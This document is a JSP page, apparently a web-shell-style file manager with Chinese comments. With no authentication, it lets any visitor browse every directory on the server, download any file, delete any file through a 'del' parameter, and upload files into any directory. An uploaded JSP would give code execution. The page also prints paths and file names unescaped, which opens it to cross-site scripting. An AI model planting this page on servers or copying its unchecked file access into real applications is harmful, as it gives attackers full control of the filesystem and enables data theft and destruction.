<%@ page import="java.io.*" %>
<%@ page import="java.util.Iterator" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.net.URLEncoder" %>
<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>files</title>
    <script type="text/javascript">

    </script>
    <style type="text/css">
        table {width: 100%;}
        td {border:1px solid #eee;}
        li {list-style-type:none; line-height: 20px;}

        #divFileUpload {
            clear: both;
            padding-top: 20px;
            padding-bottom: 20px;
        }
        #divMenuTree {
            border: 1px solid #ddd;
            width : 30%;
            float: left;
        }

        #divFileList {
            border: 1px solid #ddd;
            width : 68%;
            float: left;
        }
    </style>
</head>
<body>

    <%
        // 判断是否有删除请求
        String del = request.getParameter("del");
        if (null != del && !"".equals(del)) {
            del = new String(del.getBytes("iso-8859-1"), "utf-8");
            File tmp = new File(del);
            tmp.delete();
        }

        // 文件遍历
        String path = request.getParameter("path");
        if (null == path || "".equals(path)) {
            path = request.getSession().getServletContext().getRealPath("/");
        } else {
            path = new String(path.getBytes("iso-8859-1"), "utf-8");
        }

        File file = new File(path);

        // 判断是否有上传请求
        final int MAX = 5000*1000;
        String contentType = request.getContentType();
        if (null != contentType && contentType.indexOf("multipart/form-data") > -1){
            int formDataLength = request.getContentLength();
            if (formDataLength < MAX) {
                String base = file.getAbsolutePath();
                String tempFileName = "tmp000";
                String tempFilePath = base + File.separator + tempFileName;
                InputStream in = request.getInputStream();
                FileOutputStream os = new FileOutputStream(tempFilePath);
                byte b[] = new byte[1000];
                int n;
                while ((n = in.read(b)) != -1) {
                    os.write(b, 0, n);
                }
                os.close();
                in.close();

                RandomAccessFile randomFile = new RandomAccessFile(tempFilePath, "r");
                randomFile.readLine();
                String fileDesc = randomFile.readLine();

                if(fileDesc == null) {
                    fileDesc = "";
                } else {
                    fileDesc = new String(fileDesc.getBytes("iso-8859-1"), "utf-8");
                    int position = fileDesc.lastIndexOf("filename");
                    String filename = fileDesc.substring(position + 10, fileDesc.length() - 1);
                    randomFile.seek(0);
                    //设置一个向前键入的索引位置
                    long forthEnterPosition = 0;
                    //设置一个向前的索引位置
                    int forth = 1;

                    while ((n = randomFile.readByte()) != -1 && (forth <= 4)) {
                        if (n == '\n') {
                            //向前键入的位置为文件中的当前偏移量。
                            forthEnterPosition = randomFile.getFilePointer();
                            forth++;
                        }
                    }

                    //在这个路径下新建一个文件,文件名就是上面得到的文件名
                    File saveFile1 = new File(base, filename);
                    //创建从中读取和向其中写入（可选）的随机存取文件流,访问模式为 可读可写
                    RandomAccessFile randomFile2 = new RandomAccessFile(saveFile1, "rw");
                    //设置randomFile2文件的偏移量为randomFile1的长度
                    randomFile.seek(randomFile.length());
                    //得到randomFile1的文件偏移量赋给endPosition
                    long endPosition = randomFile.getFilePointer();
                    int j = 1;
                    while ((endPosition >= 0) && (j <= 2)) {
                        endPosition--;
                        randomFile.seek(endPosition);
                        if (randomFile.readByte() == '\n')
                            j++;
                    }
                    //重新设置randomFile1的文件偏移量
                    randomFile.seek(forthEnterPosition);
                    //得到randomFile1的文件偏移量赋给startpoint
                    long startPoint = randomFile.getFilePointer();
                    //如果开始索引处小于最后的索引处-1.因为最后一个是'\n',
                    while (startPoint < endPosition - 1) {
                        //就给randomFile2文件写入randomFile1的所有字节数据..就相当于复制
                        randomFile2.write(randomFile.readByte());
                        //重新设置开始索引为randomFile1的文件偏移量
                        startPoint = randomFile.getFilePointer();
                    }
                    //关闭randomFile2
                    randomFile2.close();
                    //关闭randomFile1
                    randomFile.close();
                    //删除临时文件
                    new File(tempFilePath).delete();

                }

            }
        }

        // 文件遍历及下载
        if (file.isFile()) {
            response.reset();
            response.setContentType("application/x-download");

            response.addHeader("Content-Disposition","attachment;filename=" + file.getName());

            OutputStream outp = null;
            FileInputStream in = null;
            try
            {
                outp = response.getOutputStream();
                in = new FileInputStream(file);

                byte[] b = new byte[1024];
                int i = 0;

                while((i = in.read(b)) > 0)
                {
                    outp.write(b, 0, i);
                }
                outp.flush();
            }
            catch(Exception e)
            {
                e.printStackTrace();
            }
            finally
            {
                if(in != null)
                {
                    in.close();
                    in = null;
                }
                if(outp != null)
                {
                    outp.close();
                    outp = null;
                }
            }
        } else {
            File files[] = file.listFiles();
            %>
            <div id="divMenuTree">
                <ul>
                    <%
                        File[] roots = File.listRoots();
                        System.out.println(roots.length);
                        if (roots.length < 2) {
                            File tmp = roots[0];
                            roots = tmp.listFiles();
                            System.out.println(roots.length);
                        }
                        for (File root : roots) {
                            %>
                            <li><a href="files.jsp?path=<%=root.getAbsolutePath()%>"><%=root.getAbsolutePath()%></a></li>
                            <%
                        }
                    %>
                </ul>
            </div>
            <div id="divFileList">
                <table>
                    <tr>
                        <%
                            if (null != file.getParentFile()) {
                                %>
                                    <td colspan="3">
                                        <a href="files.jsp?path=<%=file.getParentFile().getAbsolutePath()%>">上级目录</a>
                                        <a href='files.jsp?path=<%=request.getSession().getServletContext().getRealPath("/")%>'>运行目录</a>
                                    </td>
                                <%
                            } else {
                                %><td colspan="3">根目录</td> <%
                            }
                        %>
                    </tr>
                    <tr>
                        <td>文件名</td>
                        <td>大小</td>
                        <td>管理</td>
                    </tr>
            <%
            for (File tmp:files) {
            %>
                <tr>
                    <td width="40%">
                        <a href="files.jsp?path=<%=tmp.getAbsolutePath()%>"><%= tmp.getName() %></a>
                    </td>
                    <td width="30%"><%= tmp.length()/1000.0 %>KB</td>
                    <td width="30%">
                        <%
                            if (tmp.isDirectory()) {
                                %>
                                    <a href="files.jsp?path=<%=tmp.getAbsolutePath()%>">打开</a>
                                <%
                            } else {
                                 %><a href="files.jsp?path=<%=tmp.getAbsolutePath()%>">下载</a><%
                            }
                        %>

                        <a href="files.jsp?del=<%=tmp.getAbsolutePath()%>">删除</a>
                    </td>
                </tr>
            <%
            }
            %>
                </table>
                <div id="divFileUpload">
                    <form action="files.jsp" method="post" enctype="multipart/form-data">
                        <input type="file" name="upfile" size="50" />
                        <input type="submit" value="上传" />
                    </form>
                </div>
            </div>
            <%
        }

    %>

</body>
</html>